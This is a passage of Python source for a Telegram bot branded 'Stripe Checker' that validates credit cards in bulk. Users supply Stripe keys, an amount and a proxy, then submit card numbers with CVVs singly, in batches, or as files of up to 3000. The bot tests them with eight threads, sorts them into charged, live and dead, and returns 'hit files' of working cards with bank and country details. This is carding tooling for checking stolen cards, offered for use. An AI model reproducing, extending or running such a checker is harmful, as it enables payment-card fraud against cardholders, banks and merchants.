**Amount:** `${user['amount']:.2f}`

**Status:** {'✅ Ready to Check (8 Threads Enabled ⚡)' if user['sk_key'] and user['pk_key'] else '❌ SK/PK Required'}
    """
    
    await message.reply_text(config_text, parse_mode=ParseMode.MARKDOWN)

@app.on_message(filters.command("deleteconfig") & filters.private)
async def delete_config_command(client, message):
    user_id = message.from_user.id
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Yes", callback_data="delete_yes"),
         InlineKeyboardButton("❌ No", callback_data="delete_no")]
    ])
    
    await message.reply_text(
        "⚠️ **Are you sure you want to delete all configuration?**\n\nThis will remove your SK, PK, proxy, and amount settings.",
        reply_markup=keyboard,
        parse_mode=ParseMode.MARKDOWN
    )

@app.on_callback_query(filters.regex("^delete_"))
async def delete_config_callback(client, callback_query):
    user_id = callback_query.from_user.id
    
    if callback_query.data == "delete_yes":
        await update_user_data(user_id, {
            'sk_key': None,
            'pk_key': None,
            'proxy': None,
            'amount': 1.0
        })
        await callback_query.message.edit_text("✅ Configuration deleted successfully!")
    else:
        await callback_query.message.edit_text("❌ Configuration deletion cancelled.")
    
    await callback_query.answer()

@app.on_message(filters.command("single") & filters.private)
async def single_check_command(client, message):
    user_id = message.from_user.id
    user = await get_user_data(user_id)
    
    if not user['sk_key'] or not user['pk_key']:
        await message.reply_text("❌ Please set SK and PK keys first using /setsk and /setpk")
        return
    
    if len(message.command) < 2 and not message.reply_to_message:
        await message.reply_text("❌ Please provide CC or reply to a message with CC\nUsage: `/single cc|mm|yy|cvv`", parse_mode=ParseMode.MARKDOWN)
        return
    
    if len(message.command) >= 2:
        cc_string = ' '.join(message.command[1:])
    else:
        cc_string = message.reply_to_message.text
    
    if not cc_string:
        await message.reply_text("❌ No CC found")
        return
    
    checking_msg = await message.reply_text("🔍 Checking CC...")
    start_time = time.time()
    
    try:
        result = await checker.check_single_cc_threaded(
            cc_string,
            user['sk_key'],
            user['pk_key'],
            user['amount'],
            user['proxy']
        )
        
        check_time = time.time() - start_time
        hours = int(check_time // 3600)
        minutes = int((check_time % 3600) // 60)
        seconds = int(check_time % 60)
        time_taken = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        
        bin_info = result.get('bin_details', {})
        flag = bin_info.get('flag', '🌍')
        brand = bin_info.get('brand', 'UNKNOWN')
        bank = bin_info.get('bank', 'UNKNOWN')
        country = bin_info.get('country', 'UNKNOWN')
        card_type = bin_info.get('type', 'UNKNOWN')
        
        result_text = f"""
💳 **CC Check Result**

**Card:** `{result['cc']}`
**Status:** {result['status']}
**Response:** {result['response']} [{result.get('match_key', 'N/A')}]
**Amount:** ${user['amount']:.2f}
**Time Taken:** {time_taken}

**BIN Information:**
{flag} **Country:** {country}
💳 **Brand:** {brand}
🏦 **Bank:** {bank}
🃏 **Type:** {card_type}

**CHK BY** @still_alivenow
        """
        
        if result.get('receipt_url'):
            result_text += f"\n**Receipt:** {result['receipt_url']}"
        
        await checking_msg.edit_text(result_text, parse_mode=ParseMode.MARKDOWN)
        
    except Exception as e:
        await checking_msg.edit_text(f"❌ Error checking CC: {str(e)}")

@app.on_message(filters.command("multi") & filters.private)
async def multi_check_command(client, message):
    user_id = message.from_user.id
    user = await get_user_data(user_id)
    
    if not user['sk_key'] or not user['pk_key']:
        await message.reply_text("❌ Please set SK and PK keys first using /setsk and /setpk")
        return
    
    cc_list = []
    if message.reply_to_message:
        text = message.reply_to_message.text
        cc_list = [line.strip() for line in text.split('\n') if line.strip()]
    elif len(message.command) > 1:
        text = ' '.join(message.command[1:])
        cc_list = [cc.strip() for cc in text.split('\n') if cc.strip()]
    
    if not cc_list:
        await message.reply_text("❌ No CCs found\nReply to a message with CCs or provide them after command")
        return
    
    if len(cc_list) > 20:
        cc_list = cc_list[:20]
        await message.reply_text(f"⚠️ Limited to first 20 CCs")
    
    unique_key = generate_unique_key()
    
    status_text = f"""
**Stripe Checker ⚡**

• **Gateway** - SK BASED ${user['amount']:.2f} CVV ♻️
• **Total CC Input** - {len(cc_list)}
• **Charged** - 0
• **Live** - 0
• **Dead** - 0
• **Total Checked** - 0/{len(cc_list)}
• **Secret Key** - {user['sk_key'][:10]}...
• **Threads** - 8 ⚡
• **Status** - Starting... ⏳

• **Time** - 0h 0m 0s
    """
    
    status_msg = await message.reply_text(status_text, parse_mode=ParseMode.MARKDOWN)
    
    stop_keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{unique_key}")]
    ])
    
    await status_msg.edit_reply_markup(stop_keyboard)
    
    try:
        results = await process_batch_ccs(cc_list, user, user_id, unique_key, status_msg)
        
        if unique_key in checker.active_checks:
            elapsed = time.time() - checker.active_checks[unique_key]['start_time']
        else:
            elapsed = 0
        
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        
        total_live_charged = len(results['CHARGED']) + len(results['LIVE'])
        
        # Only save and send files if there are LIVE or CHARGED cards
        hit_filepath = None
        cc_filepath = None
        
        if total_live_charged > 0:
            hit_filename, cc_filename, json_filename = await checker.save_hit_file(unique_key, results)
            
            if hit_filename and cc_filename:
                hit_filepath = os.path.join(HIT_FOLDER, hit_filename)
                cc_filepath = os.path.join(HIT_FOLDER, cc_filename)
        
        status_text = f"""
**Stripe Checker ⚡**

• **Gateway** - SK BASED ${user['amount']:.2f} CVV ♻️
• **Total CC Input** - {len(cc_list)}
• **Charged** - {len(results['CHARGED'])}
• **Live** - {len(results['LIVE'])}
• **Dead** - {len(results['DEAD'])}
• **Total Checked** - {len(cc_list)}/{len(cc_list)}
• **Secret Key** - {user['sk_key'][:10]}...
• **Status** - Checked All ✅

• **Time** - {hours}h {minutes}m {seconds}s

**Your Key:** `{unique_key}`
**Live/Charged Cards:** {total_live_charged}
**Files saved:** {'✅ (Auto-deletes after 7h)' if total_live_charged > 0 else '❌ No live cards found'}
        """
        
 
        if total_live_charged > 0:
            results_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("📥 Get All Results", callback_data=f"get_results_{unique_key}"),
                 InlineKeyboardButton("💳 Get CC List", callback_data=f"get_cc_{unique_key}")],
                [InlineKeyboardButton("⚡ Get Live Cards", callback_data=f"get_live_{unique_key}")]
            ])
            
            # Send hit file automatically if there are live cards
            try:
                with open(hit_filepath, 'rb') as f:
                    await message.reply_document(
                        document=f,
                        caption=f"✅ **HIT FILE - {unique_key}**\n\nCharged: {len(results['CHARGED'])}\nLive: {len(results['LIVE'])}\nTotal: {total_live_charged}\n\n⚠️ Auto-deletes in 7h",
                        parse_mode=ParseMode.MARKDOWN
                    )
            except Exception as e:
                logger.error(f"Error sending hit file: {e}")
        else:
            results_keyboard = None
        
        await status_msg.edit_text(status_text, reply_markup=results_keyboard, parse_mode=ParseMode.MARKDOWN)
        
    except Exception as e:
        logger.error(f"Error in multi check: {e}")
        if unique_key in checker.active_checks:
            del checker.active_checks[unique_key]
        await status_msg.edit_text(f"❌ Error during check: {str(e)}")

@app.on_message(filters.command("txt") & filters.private)
async def txt_check_command(client, message):
    user_id = message.from_user.id
    user = await get_user_data(user_id)
    
    if not user['sk_key'] or not user['pk_key']:
        await message.reply_text("❌ Please set SK and PK keys first using /setsk and /setpk")
        return
    
    if not message.reply_to_message or not message.reply_to_message.document:
        await message.reply_text("❌ Please reply to a TXT file")
        return
    
    document = message.reply_to_message.document
    if not document.file_name.endswith('.txt'):
        await message.reply_text("❌ File must be a TXT file")
        return
    
    downloading_msg = await message.reply_text("📥 Downloading file...")
    
    try:
        file_path = await client.download_media(document)
        
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            cc_list = [line.strip() for line in f.readlines() if line.strip()]
        
        os.remove(file_path)
        
        if not cc_list:
            await downloading_msg.edit_text("❌ No valid CCs found in file")
            return
        
        if len(cc_list) > 3000:
            cc_list = cc_list[:3000]
            await message.reply_text(f"⚠️ Limited to first 3000 CCs")
        
        await downloading_msg.edit_text(f"✅ Loaded {len(cc_list)} CCs from file")
        
        unique_key = generate_unique_key()
        
        status_text = f"""
**Stripe Checker ⚡**

• **Gateway** - SK BASED ${user['amount']:.2f} CVV ♻️
• **Total CC Input** - {len(cc_list)}
• **Charged** - 0
• **Live** - 0
• **Dead** - 0
• **Total Checked** - 0/{len(cc_list)}
• **Secret Key** - {user['sk_key'][:10]}...
• **Threads** - 8 ⚡
• **Status** - Starting... ⏳

• **Time** - 0h 0m 0s
        """
        
        status_msg = await message.reply_text(status_text, parse_mode=ParseMode.MARKDOWN)
        
        stop_keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🛑 STOP", callback_data=f"stop_check_{unique_key}")]
        ])
        
        await status_msg.edit_reply_markup(stop_keyboard)
        
        results = await process_batch_ccs(cc_list, user, user_id, unique_key, status_msg)
        
        if unique_key in checker.active_checks:
            elapsed = time.time() - checker.active_checks[unique_key]['start_time']
        else:
            elapsed = 0
        
        hours = int(elapsed // 3600)
        minutes = int((elapsed % 3600) // 60)
        seconds = int(elapsed % 60)
        
        total_live_charged = len(results['CHARGED']) + len(results['LIVE'])
        
 
        hit_filepath = None
        cc_filepath = None
        
        if total_live_charged > 0:
            hit_filename, cc_filename, json_filename = await checker.save_hit_file(unique_key, results)
            
            if hit_filename and cc_filename:
                hit_filepath = os.path.join(HIT_FOLDER, hit_filename)
                cc_filepath = os.path.join(HIT_FOLDER, cc_filename)
        
        status_text = f"""
**Stripe Checker ⚡**

• **Gateway** - SK BASED ${user['amount']:.2f} CVV ♻️
• **Total CC Input** - {len(cc_list)}
• **Charged** - {len(results['CHARGED'])}
• **Live** - {len(results['LIVE'])}
• **Dead** - {len(results['DEAD'])}
• **Total Checked** - {len(cc_list)}/{len(cc_list)}
• **Secret Key** - {user['sk_key'][:10]}...
• **Status** - Checked All ✅

• **Time** - {hours}h {minutes}m {seconds}s

**Your Key:** `{unique_key}`
**Live/Charged Cards:** {total_live_charged}
**Files saved:** {'✅ (Auto-deletes after 7h)' if total_live_charged > 0 else '❌ No live cards found'}
        """
        

        if total_live_charged > 0:
            results_keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("📥 Get All Results", callback_data=f"get_results_{unique_key}"),
                 InlineKeyboardButton("💳 Get CC List", callback_data=f"get_cc_{unique_key}")],
                [InlineKeyboardButton("⚡ Get Live Cards", callback_data=f"get_live_{unique_key}")]
            ])
            

            try:
                with open(hit_filepath, 'rb') as f:
                    await message.reply_document(
                        document=f,
                        caption=f"✅ **HIT FILE - {unique_key}**\n\nCharged: {len(results['CHARGED'])}\nLive: {len(results['LIVE'])}\nTotal: {total_live_charged}\n\n⚠️ Auto-deletes in 7h",
                        parse_mode=ParseMode.MARKDOWN
                    )
            except Exception as e:
                logger.error(f"Error sending hit file: {e}")
        else:
            results_keyboard = None
        
        await status_msg.edit_text(status_text, reply_markup=results_keyboard, parse_mode=ParseMode.MARKDOWN)
    
    except Exception as e:
        await downloading_msg.edit_text(f"❌ Error processing file: {str(e)}")

@app.on_message(filters.command("stop") & filters.private)
async def stop_check_command(client, message):
    user_id = message.from_user.id
    
    for key, check in checker.active_checks.items():
        if check['user_id'] == user_id:
            check['running'] = False
            await message.reply_text("⏹️ Stopping check...")
            return
    
    await message.reply_text("❌ No active check found")

@app.on_callback_query(filters.regex("^stop_check_"))
async def stop_check_callback(client, callback_query):
    unique_key = callback_query.data.replace("stop_check_", "")
    
    if unique_key in checker.active_checks:
        checker.active_checks[unique_key]['running'] = False
        await callback_query.answer("⏹️ Stopping check...")
    else:
        await callback_query.answer("❌ Check already stopped")

@app.on_callback_query(filters.regex("^get_results_"))
async def get_results_callback(client, callback_query):
    unique_key = callback_query.data.replace("get_results_", "")
    user_id = callback_query.from_user.id
    
    filepath = await checker.get_hit_file(unique_key)
    
    if not filepath:
        await callback_query.answer("❌ Results expired or not found")
        return
    
    try:
        with open(filepath, 'rb') as f:
            await client.send_document(
                chat_id=user_id,
                document=f,
                caption=f"📊 Results for key: `{unique_key}`\n\n⚠️ This file will be auto-deleted in 7 hours",
                parse_mode=ParseMode.MARKDOWN
            )
        
        await callback_query.answer("📥 Results sent!")
    except Exception as e:
        logger.error(f"Error sending results: {e}")
        await callback_query.answer("❌ Error sending results")

@app.on_callback_query(filters.regex("^get_cc_"))
async def get_cc_callback(client, callback_query):
    unique_key = callback_query.data.replace("get_cc_", "")
    user_id = callback_query.from_user.id
    
    filepath = await checker.get_cc_file(unique_key)
    
    if not filepath:
        await callback_query.answer("❌ CC file expired or not found")
        return
    
    try:
        with open(filepath, 'rb') as f:
            await client.send_document(
                chat_id=user_id,
                document=f,
                caption=f"💳 CC List for key: `{unique_key}`\n\n⚠️ This file will be auto-deleted in 7 hours",
                parse_mode=ParseMode.MARKDOWN
            )
        
        await callback_query.answer("💳 CC List sent!")
    except Exception as e:
        logger.error(f"Error sending CC list: {e}")
        await callback_query.answer("❌ Error sending CC list")

@app.on_callback_query(filters.regex("^get_live_"))
async def get_live_callback(client, callback_query):
    unique_key = callback_query.data.replace("get_live_", "")
    user_id = callback_query.from_user.id
    
    json_file = None
    for filename in os.listdir(HIT_FOLDER):
        if filename.startswith(unique_key + "_") and filename.endswith(".json"):
            json_file = os.path.join(HIT_FOLDER, filename)
            break
    
    if not json_file:
        await callback_query.answer("❌ Results not found")
        return
    
    try:
        with open(json_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        results = data.get('results', {})
        
        live_cards = results.get('CHARGED', []) + results.get('LIVE', [])
        
        if not live_cards:
            await callback_query.answer("❌ No live/charged cards found")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        live_content = f"""LIVE/CHARGED CARDS - {unique_key}
================================
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Total Live/Charged: {len(live_cards)}
Charged: {len(results.get('CHARGED', []))}
Live: {len(results.get('LIVE', []))}
================================

"""
        
        for i, card in enumerate(live_cards, 1):
            bin_info = card.get('bin_details', {})
            live_content += f"{i}. {card['cc']}\n"
            live_content += f"   Response: {card['response']} [{card.get('match_key', 'N/A')}]\n"
            live_content += f"   BIN: {card['cc'][:6]} | {bin_info.get('flag', '🌍')} {bin_info.get('country', 'UNKNOWN')}\n"
            live_content += f"   Bank: {bin_info.get('bank', 'UNKNOWN')} | Type: {bin_info.get('type', 'UNKNOWN')}\n"
            
            if card.get('receipt_url'):
                live_content += f"   Receipt: {card['receipt_url']}\n"
            
            live_content += "\n"
        
        live_bytes = BytesIO(live_content.encode())
        live_bytes.name = f"live_cards_{unique_key}_{timestamp}.txt"
        
        await client.send_document(
            chat_id=user_id,
            document=live_bytes,
            caption=f"⚡ Live/Charged Cards for key: `{unique_key}`\n\nTotal: {len(live_cards)} cards",
            parse_mode=ParseMode.MARKDOWN
        )
        
        await callback_query.answer("⚡ Live cards sent!")
        
    except Exception as e:
        logger.error(f"Error sending live cards: {e}")
        await callback_query.answer("❌ Error sending live cards")

@app.on_message(filters.command("gethit") & filters.private)
async def get_hit_command(client, message):
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide unique key\nUsage: `/gethit GENZ-SKBASED-XXXXXXX`", parse_mode=ParseMode.MARKDOWN)
        return
    
    unique_key = message.command[1]
    user_id = message.from_user.id
    
    filepath = await checker.get_hit_file(unique_key)
    
    if not filepath:
        await message.reply_text("❌ Results expired or not found\nFiles are automatically deleted after 7 hours.")
        return
    
    try:
        with open(filepath, 'rb') as f:
            await message.reply_document(
                document=f,
                caption=f"📊 Results for key: `{unique_key}`\n\n⚠️ This file will be auto-deleted in 7 hours",
                parse_mode=ParseMode.MARKDOWN
            )
    except Exception as e:
        await message.reply_text(f"❌ Error sending results: {str(e)}")

@app.on_message(filters.command("getcc") & filters.private)
async def get_cc_command(client, message):
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide unique key\nUsage: `/getcc GENZ-SKBASED-XXXXXXX`", parse_mode=ParseMode.MARKDOWN)
        return
    
    unique_key = message.command[1]
    user_id = message.from_user.id
    
    filepath = await checker.get_cc_file(unique_key)
    
    if not filepath:
        await message.reply_text("❌ CC file expired or not found\nFiles are automatically deleted after 7 hours.")
        return
    
    try:
        with open(filepath, 'rb') as f:
            await message.reply_document(
                document=f,
                caption=f"💳 CC List for key: `{unique_key}`\n\n⚠️ This file will be auto-deleted in 7 hours",
                parse_mode=ParseMode.MARKDOWN
            )
    except Exception as e:
        await message.reply_text(f"❌ Error sending CC list: {str(e)}")

@app.on_message(filters.command("getlive") & filters.private)
async def get_live_command(client, message):
    if len(message.command) < 2:
        await message.reply_text("❌ Please provide unique key\nUsage: `/getlive GENZ-SKBASED-XXXXXXX`", parse_mode=ParseMode.MARKDOWN)
        return
    
    unique_key = message.command[1]
    user_id = message.from_user.id
    
    json_file = None
    for filename in os.listdir(HIT_FOLDER):
        if filename.startswith(unique_key + "_") and filename.endswith(".json"):
            json_file = os.path.join(HIT_FOLDER, filename)
            break
    
    if not json_file:
        await message.reply_text("❌ Results not found or expired")
        return
    
    try:
        with open(json_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        results = data.get('results', {})
        
        live_cards = results.get('CHARGED', []) + results.get('LIVE', [])
        
        if not live_cards:
            await message.reply_text("❌ No live/charged cards found in these results")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        live_content = f"""LIVE/CHARGED CARDS - {unique_key}
================================
Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
Total Live/Charged: {len(live_cards)}
Charged: {len(results.get('CHARGED', []))}
Live: {len(results.get('LIVE', []))}
================================

"""
        
        for i, card in enumerate(live_cards, 1):
            bin_info = card.get('bin_details', {})
            live_content += f"{i}. {card['cc']}\n"
            live_content += f"   Response: {card['response']} [{card.get('match_key', 'N/A')}]\n"
            live_content += f"   BIN: {card['cc'][:6]} | {bin_info.get('flag', '🌍')} {bin_info.get('country', 'UNKNOWN')}\n"
            live_content += f"   Bank: {bin_info.get('bank', 'UNKNOWN')} | Type: {bin_info.get('type', 'UNKNOWN')}\n"
            
            if card.get('receipt_url'):
                live_content += f"   Receipt: {card['receipt_url']}\n"
            
            live_content += "\n"
        
        live_bytes = BytesIO(live_content.encode())
        live_bytes.name = f"live_cards_{unique_key}_{timestamp}.txt"
        
        await message.reply_document(
            document=live_bytes,
            caption=f"⚡ Live/Charged Cards for key: `{unique_key}`\n\nTotal: {len(live_cards)} cards",
            parse_mode=ParseMode.MARKDOWN
        )
        
    except Exception as e:
        await message.reply_text(f"❌ Error getting live cards: {str(e)}")

@app.on_message(filters.command("startup"))
async def startup_command(client, message):
    if message.from_user.id != OWNER_ID:
        return
    
    await message.reply_text("✅ Bot cleanup task is running")

from pyrogram import idle

async def main():
    asyncio.create_task(cleanup_old_files())
    
    print("Starting Stripe Checker Bot...")
    print(f"HIT folder: {os.path.abspath(HIT_FOLDER)}")
    await app.start()
    print("Bot is running...")
    
    me = await app.get_me()
    print(f"Bot username: @{me.username}")
    print(f"Bot ID: {me.id}")
    
    await idle()

if __name__ == "__main__":
    try:
        loop = asyncio.get_event_loop()
        
        loop.run_until_complete(main())
        
    except KeyboardInterrupt:
        print("\nBot stopped by user")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        if app.is_connected:
            loop.run_until_complete(app.stop())
        print("Bot stopped")
